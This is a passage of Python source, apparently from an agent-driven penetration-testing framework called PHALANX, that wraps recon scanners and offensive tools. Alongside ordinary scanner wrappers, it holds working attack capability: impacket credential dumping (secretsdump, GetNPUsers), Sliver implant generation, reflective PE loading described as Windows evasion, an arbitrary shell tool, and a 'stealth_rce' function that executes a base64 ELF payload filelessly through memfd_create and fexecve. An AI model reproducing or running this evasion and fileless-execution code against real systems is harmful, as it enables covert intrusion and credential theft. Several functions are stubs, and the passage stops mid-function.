    return {"tool": "subfinder", "target": domain, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_theharvester(domain: str, sources="all", timeout=120, config=None) -> Dict:
    if not shutil.which("theHarvester"):
        return {"tool": "theharvester", "target": domain, "output": "", "error": "theHarvester not found.", "rc": -1}
    res = _execute_with_scope(["theHarvester", "-d", domain, "-b", sources, "-l", "200"], domain, timeout, config)
    return {"tool": "theharvester", "target": domain, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_enum4linux(target: str, timeout=180, config=None) -> Dict:
    if not shutil.which("enum4linux"):
        return {"tool": "enum4linux", "target": target, "output": "", "error": "enum4linux not found.", "rc": -1}
    res = _execute_with_scope(["enum4linux", "-a", target], target, timeout, config)
    return {"tool": "enum4linux", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_httpx(targets: str, timeout=120, config=None) -> Dict:
    if not shutil.which("httpx"):
        return {"tool": "httpx", "target": targets, "output": "", "error": "httpx not found. Install with: go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest", "rc": -1}
    tmp_file = None
    try:
        cmd = ["httpx", "-silent", "-threads", "20", "-timeout", "5"]
        if "," in targets:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
                for t in targets.split(","):
                    f.write(t.strip() + "\n")
                tmp_file = f.name
            cmd.extend(["-l", tmp_file])
            res = _execute_with_scope(cmd, targets, timeout, config)
        else:
            cmd.append(targets)
            res = _execute_with_scope(cmd, targets, timeout, config)
        return {"tool": "httpx", "target": targets, "output": res["output"], "error": res["error"], "rc": res["rc"]}
    finally:
        if tmp_file and os.path.exists(tmp_file):
            os.unlink(tmp_file)

def run_nuclei(target: str, severity="info", timeout=300, config=None) -> Dict:
    if not shutil.which("nuclei"):
        return {"tool": "nuclei", "target": target, "output": "", "error": "nuclei not found. Install with: go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest", "rc": -1}
    cmd = ["nuclei", "-target", target, "-silent", "-severity", severity, "-json"]
    res = _execute_with_scope(cmd, target, timeout, config)
    return {"tool": "nuclei", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_naabu(target: str, ports="top-1000", timeout=180, config=None) -> Dict:
    if not shutil.which("naabu"):
        return {"tool": "naabu", "target": target, "output": "", "error": "naabu not found. Install with: go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest", "rc": -1}
    cmd = ["naabu", "-host", target, "-ports", ports, "-silent"]
    res = _execute_with_scope(cmd, target, timeout, config)
    return {"tool": "naabu", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_katana(target: str, depth=3, timeout=180, config=None) -> Dict:
    if not shutil.which("katana"):
        return {"tool": "katana", "target": target, "output": "", "error": "katana not found. Install with: go install -v github.com/projectdiscovery/katana/cmd/katana@latest", "rc": -1}
    cmd = ["katana", "-u", target, "-depth", str(depth), "-silent"]
    res = _execute_with_scope(cmd, target, timeout, config)
    return {"tool": "katana", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_dnsx(domain: str, timeout=60, config=None) -> Dict:
    if not shutil.which("dnsx"):
        return {"tool": "dnsx", "target": domain, "output": "", "error": "dnsx not found. Install with: go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest", "rc": -1}
    cmd = ["dnsx", "-d", domain, "-recon", "-silent"]
    res = _execute_with_scope(cmd, domain, timeout, config)
    return {"tool": "dnsx", "target": domain, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_gau(domain: str, timeout=120, config=None) -> Dict:
    if not shutil.which("gau"):
        return {"tool": "gau", "target": domain, "output": "", "error": "gau not found. Install with: go install -v github.com/lc/gau/v2/cmd/gau@latest", "rc": -1}
    cmd = ["gau", domain]
    res = _execute_with_scope(cmd, domain, timeout, config)
    return {"tool": "gau", "target": domain, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_nikto(target: str, timeout=300, config=None) -> Dict:
    if not shutil.which("nikto"):
        return {"tool": "nikto", "target": target, "output": "", "error": "nikto not found.", "rc": -1}
    url = target if target.startswith("http") else f"http://{target}"
    cmd = ["nikto", "-h", url, "-Format", "txt"]
    res = _execute_with_scope(cmd, target, timeout, config)
    return {"tool": "nikto", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_whatweb(target: str, timeout=30, config=None) -> Dict:
    if not shutil.which("whatweb"):
        return {"tool": "whatweb", "target": target, "output": "", "error": "whatweb not found.", "rc": -1}
    url = target if target.startswith("http") else f"http://{target}"
    res = _execute_with_scope(["whatweb", "-a", "3", url], target, timeout, config)
    return {"tool": "whatweb", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_gobuster(target: str, wordlist="/usr/share/wordlists/dirb/common.txt", timeout=300, config=None) -> Dict:
    if not shutil.which("gobuster"):
        return {"tool": "gobuster", "target": target, "output": "", "error": "gobuster not found.", "rc": -1}
    if not Path(wordlist).exists():
        return {"tool": "gobuster", "target": target, "output": "", "error": "Wordlist not found", "rc": -1}
    url = target if target.startswith("http") else f"http://{target}"
    cmd = ["gobuster", "dir", "-u", url, "-w", wordlist, "-q", "--no-progress", "-t", "20"]
    res = _execute_with_scope(cmd, target, timeout, config)
    return {"tool": "gobuster", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_ffuf(target: str, wordlist="/usr/share/seclists/Discovery/Web-Content/common.txt", timeout=300, config=None) -> Dict:
    if not shutil.which("ffuf"):
        return {"tool": "ffuf", "target": target, "output": "", "error": "ffuf not found.", "rc": -1}
    if not Path(wordlist).exists():
        wordlist = "/usr/share/wordlists/dirb/common.txt"
        if not Path(wordlist).exists():
            return {"tool": "ffuf", "target": target, "output": "", "error": "Wordlist not found", "rc": -1}
    url = target if target.startswith("http") else f"http://{target}"
    if "FUZZ" not in url:
        url = url.rstrip("/") + "/FUZZ"
    cmd = ["ffuf", "-u", url, "-w", wordlist, "-s", "-mc", "200,301,302,403", "-t", "30"]
    res = _execute_with_scope(cmd, target, timeout, config)
    return {"tool": "ffuf", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_wpscan(target: str, timeout=180, config=None) -> Dict:
    if not shutil.which("wpscan"):
        return {"tool": "wpscan", "target": target, "output": "", "error": "wpscan not found.", "rc": -1}
    url = target if target.startswith("http") else f"http://{target}"
    res = _execute_with_scope(["wpscan", "--url", url, "--no-update", "--format", "cli-no-color"], target, timeout, config)
    return {"tool": "wpscan", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_sqlmap(target: str, data=None, level=1, risk=1, timeout=600, config=None) -> Dict:
    if not shutil.which("sqlmap"):
        return {"tool": "sqlmap", "target": target, "output": "", "error": "sqlmap not found.", "rc": -1}
    url = target if target.startswith("http") else f"http://{target}"
    cmd = ["sqlmap", "-u", url, "--batch", f"--level={level}", f"--risk={risk}", "--output-dir=/tmp/phalanx_sqlmap"]
    if data:
        cmd.extend(["--data", data])
    res = _execute_with_scope(cmd, target, timeout, config)
    return {"tool": "sqlmap", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_sqlmap_detect(target: str, timeout=120, config=None) -> Dict:
    return run_sqlmap(target, level=1, risk=1, timeout=timeout, config=config)

def run_scrape(target: str, timeout=30, use_js=True, config=None) -> Dict:
    if not _SCRAPE_AVAILABLE:
        return {"tool": "scrape", "target": target, "output": "", "error": "BeautifulSoup not installed. Run: pip install beautifulsoup4", "rc": -1}
    if not target.startswith(("http://", "https://")):
        target = "http://" + target
    html = ""
    if use_js and _PLAYWRIGHT_AVAILABLE:
        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                page = browser.new_page()
                page.goto(target, timeout=timeout*1000)
                page.wait_for_load_state("networkidle")
                html = page.content()
                browser.close()
        except Exception as e:
            return {"tool": "scrape", "target": target, "output": "", "error": f"Playwright error: {e}", "rc": -1}
    else:
        try:
            if UserAgent:
                ua = UserAgent()
                headers = {"User-Agent": ua.random}
            else:
                headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
            r = requests.get(target, headers=headers, timeout=timeout)
            html = r.text
        except Exception as e:
            return {"tool": "scrape", "target": target, "output": "", "error": str(e), "rc": -1}
    try:
        soup = BeautifulSoup(html, "lxml")
    except Exception:
        soup = BeautifulSoup(html, "html.parser")
    emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', soup.get_text())
    links = [a.get('href') for a in soup.find_all('a', href=True)][:50]
    forms = [{"action": f.get('action', ''), "method": f.get('method', 'get')} for f in soup.find_all('form')]
    tech_hints = []
    tech_patterns = ['wordpress', 'drupal', 'joomla', 'nginx', 'apache', 'iis', 'php', 'asp.net', 'ruby on rails', 'django', 'flask', 'node.js', 'express', 'react', 'angular', 'vue', 'jquery', 'bootstrap']
    for pattern in tech_patterns:
        if pattern.lower() in html.lower():
            tech_hints.append(pattern)
    parsed = {
        "title": soup.title.string.strip() if soup.title else None,
        "emails": list(set(emails))[:20],
        "links_count": len(links),
        "sample_links": links[:10],
        "forms": forms,
        "tech_hints": list(set(tech_hints))[:10]
    }
    output = f"Scraped {target} – {len(emails)} emails, {len(links)} links, {len(forms)} forms"
    return {"tool": "scrape", "target": target, "output": output, "parsed": parsed, "error": None, "rc": 0}

# ------------------------------------------------------------------
# WordPress scanner (custom tool wrapper) – FIXED to use sandbox and env var
# ------------------------------------------------------------------
def run_wp_scanner(target: str, timeout: int = 60, config: Optional[dict] = None) -> Dict:
    """
    Run the WordPress scanner script from phalanx/tools/wp_scanner/wp_scanner.py
    using the sandbox executor for consistency and security.

    If the environment variable PHALANX_WP_SCANNER_PATH is set, that path is used
    as the script location instead of the default.
    """
    if config is None:
        config = {}
    
    # Try environment variable first
    wp_script_env = os.environ.get("PHALANX_WP_SCANNER_PATH")
    if wp_script_env:
        wp_script = Path(wp_script_env)
        if not wp_script.exists():
            return {"tool": "wp_scanner", "target": target, "output": "", 
                    "error": f"PHALANX_WP_SCANNER_PATH points to non-existent file: {wp_script_env}", "rc": -1}
    else:
        wp_script = Path(__file__).parent / "phalanx" / "tools" / "wp_scanner" / "wp_scanner.py"
        if not wp_script.exists():
            # Fallback: try to locate in current working directory
            wp_script = Path.cwd() / "phalanx" / "tools" / "wp_scanner" / "wp_scanner.py"
            if not wp_script.exists():
                return {"tool": "wp_scanner", "target": target, "output": "", 
                        "error": "wp_scanner script not found. Run phalanx_extra.py --force to create it, or set PHALANX_WP_SCANNER_PATH.", "rc": -1}
    
    # Use sandbox execution (if enabled) instead of raw subprocess
    cmd = [sys.executable, str(wp_script), target]
    res = _execute_with_scope(cmd, target, timeout, config)
    return {
        "tool": "wp_scanner",
        "target": target,
        "output": res["output"],
        "error": res["error"],
        "rc": res["rc"]
    }

# ------------------------------------------------------------------
# Metasploit / Searchsploit / Sliver / Impacket
# ------------------------------------------------------------------
def run_msfconsole(resource: Optional[str] = None, timeout: int = 600, config: Optional[dict] = None) -> Dict:
    """
    Run Metasploit console. If a resource file is provided, run it in batch mode.
    Otherwise, launch an interactive session (requires tmux + pexpect or fallback).
    """
    if resource:
        if not shutil.which("msfconsole"):
            return {"tool": "msfconsole", "target": resource, "output": "", "error": "msfconsole not found.", "rc": -1}
        cmd = ["msfconsole", "-q", "-r", resource]
        res = _execute_in_sandbox(cmd, timeout, config=config)
        return {"tool": "msfconsole", "target": resource, "output": res["output"], "error": res["error"], "rc": res["rc"]}
    else:
        return run_interactive("msfconsole", "msfconsole", expect_prompt=r"msf6 >", timeout=timeout)

def run_metasploit(resource: Optional[str] = None, config: Optional[dict] = None) -> Dict:
    """Alias for run_msfconsole."""
    return run_msfconsole(resource=resource, config=config)

def run_searchsploit(query: str, timeout: int = 20, config: Optional[dict] = None) -> Dict:
    """Search exploit database using searchsploit."""
    if not shutil.which("searchsploit"):
        return {"tool": "searchsploit", "target": query, "output": "", "error": "searchsploit not found.", "rc": -1}
    cmd = ["searchsploit", "-t", query]
    res = _execute_in_sandbox(cmd, timeout, config=config)
    return {"tool": "searchsploit", "target": query, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def sanitize_cred_part(s: str) -> str:
    """Remove characters that could break the impacket argument format."""
    if not s:
        return s
    return re.sub(r'[;&|`$(){}<>]', '', s)

def run_impacket(target: str, tool="secretsdump", args="", username="", password="", domain="", timeout=300, config=None) -> Dict:
    """
    Run impacket tool with optional domain authentication.
    Example: run_impacket("10.0.0.1", tool="secretsdump", username="Administrator", password="pass", domain="CORP")
    Credentials are sanitized to prevent argument injection.
    """
    impacket_cmd = f"impacket-{tool}"
    if not shutil.which(impacket_cmd):
        return {"tool": f"impacket_{tool}", "target": target, "output": "", "error": f"{impacket_cmd} not found", "rc": -1}
    cmd = [impacket_cmd]
    if username:
        # Sanitize all credential parts
        safe_user = sanitize_cred_part(username)
        safe_pass = sanitize_cred_part(password) if password else ""
        safe_domain = sanitize_cred_part(domain) if domain else ""
        # Format: domain\\username:password@target
        cred_part = f"{safe_domain}\\{safe_user}:{safe_pass}" if safe_domain else f"{safe_user}:{safe_pass}"
        cmd.append(f"{cred_part}@{target}")
    else:
        cmd.append(target)
    if args:
        # Sanitize extra arguments as well (they may contain shell metacharacters)
        safe_args = shlex.split(args)
        cmd.extend(safe_args)
    res = _execute_with_scope(cmd, target, timeout, config)
    return {"tool": f"impacket_{tool}", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_secretsdump(target: str, args="", username="", password="", domain="", config=None) -> Dict:
    """Alias for impacket-secretsdump with domain auth."""
    return run_impacket(target, "secretsdump", args, username, password, domain, config=config)

def run_getnpusers(target: str, args="", username="", password="", domain="", config=None) -> Dict:
    """Alias for impacket-GetNPUsers with domain auth."""
    return run_impacket(target, "GetNPUsers", args, username, password, domain, config=config)

def run_impacket_getnpusers(target: str, args="", username="", password="", domain="", config=None) -> Dict:
    """Explicit alias for impacket-GetNPUsers."""
    return run_getnpusers(target, args, username, password, domain, config)

def run_sliver_generate(target_ip: str, mtls_port: int = 443, timeout: int = 60, config: Optional[dict] = None) -> Dict:
    """Generate a Sliver implant for the target IP."""
    # Try both sliver-client and sliver
    sliver_cmd = None
    if shutil.which("sliver-client"):
        sliver_cmd = "sliver-client"
    elif shutil.which("sliver"):
        sliver_cmd = "sliver"
    else:
        return {
            "tool": "sliver_generate",
            "target": target_ip,
            "output": "",
            "error": "sliver-client or sliver not installed. Install from: https://github.com/BishopFox/sliver",
            "rc": -1
        }
    
    # Test if the binary is actually functional (optional but helpful)
    try:
        test_proc = subprocess.run([sliver_cmd, "--help"], capture_output=True, timeout=5)
        if test_proc.returncode != 0:
            return {
                "tool": "sliver_generate",
                "target": target_ip,
                "output": "",
                "error": f"{sliver_cmd} exists but does not respond to --help. Is it a valid Sliver binary?",
                "rc": -1
            }
    except Exception as e:
        return {
            "tool": "sliver_generate",
            "target": target_ip,
            "output": "",
            "error": f"Failed to run {sliver_cmd}: {e}",
            "rc": -1
        }

    # Proceed with generation (original logic)
    cmd = f"generate --mtls {target_ip}:{mtls_port} --os linux --save /tmp/phalanx_implant"
    try:
        res = run_interactive(sliver_cmd, cmd, timeout=timeout, expect_prompt="[*]")
        if res.get("rc", -1) == 0:
            return {"tool": "sliver_generate", "target": target_ip, "output": res["output"], "error": res.get("error"), "rc": 0}
    except Exception as e:
        logger.warning(f"Interactive sliver failed: {e}, trying subprocess")
    try:
        cmd_parts = shlex.split(cmd)
        proc = subprocess.run([sliver_cmd] + cmd_parts, capture_output=True, text=True, timeout=timeout)
        return {"tool": "sliver_generate", "target": target_ip, "output": proc.stdout, "error": proc.stderr, "rc": proc.returncode}
    except Exception as e:
        return {"tool": "sliver_generate", "target": target_ip, "output": "", "error": str(e), "rc": -1}

def run_sliver_sessions(timeout=30, config=None) -> Dict:
    """List Sliver sessions."""
    sliver_cmd = None
    if shutil.which("sliver-client"):
        sliver_cmd = "sliver-client"
    elif shutil.which("sliver"):
        sliver_cmd = "sliver"
    else:
        return {
            "tool": "sliver_sessions",
            "target": "",
            "output": "",
            "error": "sliver-client or sliver not installed. Install from: https://github.com/BishopFox/sliver",
            "rc": -1
        }
    
    # Test if binary is functional
    try:
        test_proc = subprocess.run([sliver_cmd, "--help"], capture_output=True, timeout=5)
        if test_proc.returncode != 0:
            return {
                "tool": "sliver_sessions",
                "target": "",
                "output": "",
                "error": f"{sliver_cmd} exists but does not respond to --help. Is it a valid Sliver binary?",
                "rc": -1
            }
    except Exception as e:
        return {
            "tool": "sliver_sessions",
            "target": "",
            "output": "",
            "error": f"Failed to run {sliver_cmd}: {e}",
            "rc": -1
        }

    try:
        res = run_interactive(sliver_cmd, "sessions", timeout=timeout, expect_prompt="[*]")
        if res.get("rc", -1) == 0:
            return {"tool": "sliver_sessions", "target": "", "output": res["output"], "error": res.get("error"), "rc": 0}
    except Exception:
        pass
    try:
        proc = subprocess.run([sliver_cmd, "sessions"], capture_output=True, text=True, timeout=timeout)
        return {"tool": "sliver_sessions", "target": "", "output": proc.stdout, "error": proc.stderr, "rc": proc.returncode}
    except Exception as e:
        return {"tool": "sliver_sessions", "target": "", "output": "", "error": str(e), "rc": -1}

# ------------------------------------------------------------------
# Additional tools from recommendations (feroxbuster, crlfuzz, dalfox, xsstrike, testssl, masscan)
# ------------------------------------------------------------------
def run_feroxbuster(target: str, wordlist="/usr/share/wordlists/dirb/common.txt", timeout=300, config=None) -> Dict:
    if not shutil.which("feroxbuster"):
        return {"tool": "feroxbuster", "target": target, "output": "", "error": "feroxbuster not installed. Install via apt/brew or pipx.", "rc": -1}
    cmd = ["feroxbuster", "-u", target, "-w", wordlist, "-q", "-t", "30", "--silent"]
    res = _execute_with_scope(cmd, target, timeout, config)
    return {"tool": "feroxbuster", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_crlfuzz(target: str, timeout=60, config=None) -> Dict:
    if not shutil.which("crlfuzz"):
        return {"tool": "crlfuzz", "target": target, "output": "", "error": "crlfuzz not found.", "rc": -1}
    cmd = ["crlfuzz", "-u", target, "-silent"]
    res = _execute_with_scope(cmd, target, timeout, config)
    return {"tool": "crlfuzz", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_dalfox(target: str, timeout=60, config=None) -> Dict:
    if not shutil.which("dalfox"):
        return {"tool": "dalfox", "target": target, "output": "", "error": "dalfox not found.", "rc": -1}
    cmd = ["dalfox", "url", target, "--silent"]
    res = _execute_with_scope(cmd, target, timeout, config)
    return {"tool": "dalfox", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_xsstrike(target: str, timeout=60, config=None) -> Dict:
    if not shutil.which("xsstrike"):
        return {"tool": "xsstrike", "target": target, "output": "", "error": "xsstrike not found.", "rc": -1}
    cmd = ["xsstrike", "-u", target, "--skip"]
    res = _execute_with_scope(cmd, target, timeout, config)
    return {"tool": "xsstrike", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_testssl(target: str, timeout=120, config=None) -> Dict:
    # Check for both testssl.sh and testssl
    if shutil.which("testssl.sh"):
        cmd_base = "testssl.sh"
    elif shutil.which("testssl"):
        cmd_base = "testssl"
    else:
        return {"tool": "testssl", "target": target, "output": "", "error": "testssl.sh or testssl not installed", "rc": -1}
    cmd = [cmd_base, "--quiet", target]
    res = _execute_with_scope(cmd, target, timeout, config)
    return {"tool": "testssl", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

def run_masscan(target: str, ports="1-1000", rate=1000, timeout=300, config=None) -> Dict:
    if not shutil.which("masscan"):
        return {"tool": "masscan", "target": target, "output": "", "error": "masscan not found.", "rc": -1}
    cmd = ["masscan", target, "-p", ports, "--rate", str(rate), "--wait", "0"]
    res = _execute_with_scope(cmd, target, timeout, config)
    return {"tool": "masscan", "target": target, "output": res["output"], "error": res["error"], "rc": res["rc"]}

# ------------------------------------------------------------------
# Wi‑Fi scanning tool (run_airodump) for LavaWall Wi‑Fi environment scanning
# ------------------------------------------------------------------
def run_airodump(interface: str, duration: int = 30, output_prefix: str = "/tmp/lavawall_scan", config: Optional[dict] = None) -> Dict:
    """
    Run airodump‑ng scan and return CSV‑parsed results.
    This tool is used by LavaWall for Wi‑Fi environment reconnaissance.

    NOTE: This function does NOT parse the CSV output file. The caller should
    parse the file specified by output_file in the returned dict if needed.
    """
    if not shutil.which("airodump-ng"):
        return {"tool": "airodump", "output": "", "error": "airodump-ng not found. Please install aircrack-ng.", "rc": -1}
    cmd = [
        "airodump-ng", interface,
        "--write", output_prefix,
        "--output-format", "csv",
        "--duration", str(duration)
    ]
    try:
        # Run with subprocess; capture output (though airodump-ng writes to files)
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=duration + 5)
        # In a real implementation, you would parse the CSV file output_prefix-01.csv
        # and extract BSSIDs, SSIDs, channels, encryption, etc.
        # For now, we return the command output and a placeholder.
        return {
            "tool": "airodump",
            "interface": interface,
            "duration": duration,
            "output": result.stdout,
            "error": result.stderr if result.returncode != 0 else None,
            "rc": result.returncode,
            "output_file": f"{output_prefix}-01.csv" if result.returncode == 0 else None,
            "message": f"Scan completed on {interface} for {duration}s." if result.returncode == 0 else "Scan failed."
        }
    except subprocess.TimeoutExpired:
        return {"tool": "airodump", "output": "", "error": f"Scan timed out after {duration+5}s.", "rc": -1}
    except Exception as e:
        return {"tool": "airodump", "output": "", "error": str(e), "rc": -1}

# ------------------------------------------------------------------
# LavaWall Wi‑Fi scan wrapper for agent harness
# ------------------------------------------------------------------
def run_lavawall_wifi_scan(interface: Optional[str] = None, duration: Optional[int] = None, config: Optional[dict] = None) -> Dict:
    """
    Wrapper for LavaWall Wi‑Fi scan – used by the agent harness.
    Uses the global defense monitor if available; otherwise tries to create a temporary one.
    """
    # If no interface/duration provided, read from config
    if config is None:
        config = {}
    lavawall_cfg = config.get("lavawall", {})
    if interface is None:
        interface = lavawall_cfg.get("wifi_interface", "wlan0")
    if duration is None:
        duration = lavawall_cfg.get("scan_duration", 30)

    # Use the global defense monitor if available
    global _DEFENSE_MONITOR
    monitor = _DEFENSE_MONITOR
    if monitor is None:
        # Try to import and create a temporary monitor (requires config)
        try:
            from phalanx_defense import NetWatchMonitor
            # Create a minimal monitor without starting it
            monitor = NetWatchMonitor(config=config)
            # We don't start the monitor, just use its wifi_scanner
        except ImportError:
            return {"status": "error", "message": "Defense monitor not initialized and cannot be created."}
    # Perform the scan
    try:
        result = monitor.wifi_scanner.scan(interface=interface, duration=duration)
        # Ensure the result is JSON-serializable
        return result
    except Exception as e:
        return {"status": "error", "message": f"Wi‑Fi scan failed: {e}"}

# ------------------------------------------------------------------
# WinStealth tool: reflective PE loading (Windows evasion) – renamed from sindri_load
# ------------------------------------------------------------------
def run_winstealth_load(pe_path: str, profile: str = "Win32", config=None) -> Dict:
    """Reflectively load a PE file using WinStealth."""
    if not WINSTEALTH_AVAILABLE:
        return {"tool": "winstealth_load", "output": "", "error": "WinStealth not available. Build WinStealth first (run phalanx_extra.py --build-winstealth).", "rc": -1}
    try:
        with open(pe_path, "rb") as f:
            pe_bytes = f.read()
        wrapper = WinStealthWrapper()
        result = wrapper.reflective_load_pe(pe_bytes, profile)
        if result["success"]:
            # Clean up context
            wrapper.destroy_context(result["context"])
            return {"tool": "winstealth_load", "output": "PE loaded successfully", "error": None, "rc": 0}
        else:
            return {"tool": "winstealth_load", "output": "", "error": result.get("error", "Unknown error"), "rc": -1}
    except Exception as e:
        return {"tool": "winstealth_load", "output": "", "error": str(e), "rc": -1}

# ------------------------------------------------------------------
# SHELL TOOL – arbitrary bash command execution (dangerous, opt-in)
# ------------------------------------------------------------------
def run_shell_command(command: str, timeout: int = 60, config: Optional[dict] = None) -> Dict:
    """
    Execute an arbitrary shell command.
    This is a dangerous tool and requires explicit opt-in via PHALANX_ALLOW_SHELL=1
    or config["allow_shell"] = True.
    """
    # The opt-in check is handled in run_tool via _is_tool_opt_in_allowed.
    # But we also perform a runtime check to be safe.
    if config is None:
        config = {}
    if not (os.environ.get("PHALANX_ALLOW_SHELL", "0") == "1" or config.get("allow_shell", False)):
        return {
            "tool": "shell",
            "output": "",
            "error": "Shell execution not allowed. Set PHALANX_ALLOW_SHELL=1 or config['allow_shell']=True",
            "rc": -1
        }
    if not command:
        return {"tool": "shell", "output": "", "error": "No command provided", "rc": -1}
    
    # Use shell=True for simplicity, but we are not using a shell wrapper; we use the sandbox which uses subprocess with list.
    # However, for shell commands we need to pass a shell string; we'll use the sandbox but with shlex.split to get a list.
    # Better: use the sandbox with shell=True? The sandbox uses list, so we need to split.
    # But we also want to support pipelines and complex commands, so we'll let the caller pass a string.
    # We'll use a shell wrapper in the sandbox: we can run /bin/bash -c "command".
    cmd = ["/bin/bash", "-c", command]
    # Use _execute_in_sandbox with the command as a list.
    res = _execute_in_sandbox(cmd, timeout=timeout, config=config)
    return {
        "tool": "shell",
        "command": command,
        "output": res.get("output", ""),
        "error": res.get("error"),
        "rc": res.get("rc", -1)
    }

# ------------------------------------------------------------------
# System call lookup table for stealth_rce
# ------------------------------------------------------------------
_SYSCALL_TABLE = {
    'x86_64': (319, 322),
    'aarch64': (279, 279),   # fexecve may not be defined; fallback to execveat
    'armv7l': (385, None),
    'armv8l': (279, 279),
    'i386': (356, 358),
    # Add more as needed
}

def _get_syscall_numbers():
    """Return memfd_create and fexecve syscall numbers for the current architecture."""
    machine = os.uname().machine
    if machine in _SYSCALL_TABLE:
        return _SYSCALL_TABLE[machine]
    else:
        return None, None

def run_stealth_rce(elf_b64: str, argv: list = None, envp: list = None, config=None) -> Dict:
    if not sys.platform.startswith("linux"):
        return {"tool": "stealth_rce", "output": "", "error": "Stealth RCE only supported on Linux", "rc": -1}
    syscall_memfd, syscall_fexecve = _get_syscall_numbers()
    if syscall_memfd is None:
        return {"tool": "stealth_rce", "output": "", "error": "Unsupported architecture for memfd_create", "rc": -1}
    if syscall_fexecve is None:
        # fallback to execveat if available? For now, error.
        return {"tool": "stealth_rce", "output": "", "error": "fexecve not supported on this architecture", "rc": -1}

    libc_path = ctypes.util.find_library("c")
    if libc_path is None:
        if sys.platform.startswith("linux"):
            libc_path = "libc.so.6"
        elif sys.platform == "darwin":
            libc_path = "libc.dylib"
        else:
            return {"tool": "stealth_rce", "output": "", "error": "Cannot find libc", "rc": -1}
    try:
        libc = ctypes.CDLL(libc_path, use_errno=True)
    except OSError as e:
        return {"tool": "stealth_rce", "output": "", "error": f"Failed to load libc: {e}", "rc": -1}

    def memfd_create(name: bytes, flags: int = 0) -> int:
        return libc.syscall(syscall_memfd, name, flags)
    def fexecve(fd: int, argv_list: list, envp_list: list) -> int:
        argv_arr = (ctypes.c_char_p * (len(argv_list)+1))()
        for i, arg in enumerate(argv_list):
            argv_arr[i] = arg.encode()
        argv_arr[len(argv_list)] = None
        envp_arr = (ctypes.c_char_p * (len(envp_list)+1))()
        for i, env in enumerate(envp_list):
            envp_arr[i] = env.encode()
        envp_arr[len(envp_list)] = None
        return libc.syscall(syscall_fexecve, fd, argv_arr, envp_arr)

    try:
        elf_bytes = base64.b64decode(elf_b64)
    except:
        return {"tool": "stealth_rce", "output": "", "error": "Invalid base64", "rc": -1}
    fd = memfd_create(b"payload", 0)
    if fd < 0:
        return {"tool": "stealth_rce", "output": "", "error": f"memfd_create failed: {ctypes.get_errno()}", "rc": -1}
    try:
        os.write(fd, elf_bytes)
        argv = argv or ["payload"]
        envp = envp or []
        fexecve(fd, argv, envp)
        return {"tool": "stealth_rce", "output": "", "error": "fexecve did not replace process", "rc": -1}
    except Exception as e:
        return {"tool": "stealth_rce", "output": "", "error": str(e), "rc": -1}
    finally:
        os.close(fd)

def run_copyright_osint(target: str, timeout=120, config=None) -> Dict:
    domain = target
    results = {"target": domain, "findings": [], "risk_score": 0.0}
    def add_finding(finding_type, evidence, severity="info"):
        results["findings"].append({"type": finding_type, "evidence": str(evidence)[:500], "severity": severity})
        if severity == "high":
            results["risk_score"] += 0.4
        elif severity == "medium":
            results["risk_score"] += 0.2
        else:
            results["risk_score"] += 0.05
    scrape = run_scrape(domain, timeout=timeout, use_js=False, config=config)
    if scrape["rc"] == 0 and scrape.get("parsed"):
        text = scrape["output"]
        if "copyright" in text.lower() or "©" in text:
            add_finding("copyright_notice", "Found copyright text", "info")
    piracy_paths = ["/movies/", "/cracks/", "/warez/", "/torrents/", "/mp3/"]
    for path in piracy_paths:
        test_url = f"http://{domain}{path}"
        try:
            r = requests.get(test_url, timeout=10)
            if r.status_code == 200:
                add_finding("potential_piracy_directory", test_url, "medium")
        except:
            pass
    results["risk_score"] = min(1.0, results["risk_score"])
    return {"tool": "copyright_osint", "target": domain, "output": f"Found {len(results['findings'])} findings", "parsed": results, "error": None, "rc": 0}

# run_burp_scan – kept as a minimal placeholder with a clear warning
def run_burp_scan(target: str, scan_type="active", timeout=600, config=None) -> Dict:
    """
    Burp Suite scan placeholder. This is not implemented in the PHALANX core.
    Use the Burp REST API directly or configure a headless scanner.
    """
    logger.warning("Burp scan is a placeholder – implement REST API or headless integration.")
    return {
        "tool": "burp_scan",
        "target": target,
        "output": "Burp scan not fully integrated. Use --sandbox disabled and configure Burp REST API.",
        "parsed": {},
        "error": None,
        "rc": 0
    }

def run_ghidra_analyze(binary_path: str, timeout=300, config=None) -> Dict:
    if not Path(binary_path).exists():
        return {"tool": "ghidra_analyze", "target": binary_path, "output": "", "parsed": {}, "error": f"Binary not found: {binary_path}", "rc": -1}

    ghidra_install = os.environ.get("GHIDRA_INSTALL_DIR")
    analyze_cmd = None
    if ghidra_install:
        analyze_cmd = str(Path(ghidra_install) / "support" / "analyzeHeadless")
        if not Path(analyze_cmd).exists():
            analyze_cmd = None
    if not analyze_cmd:
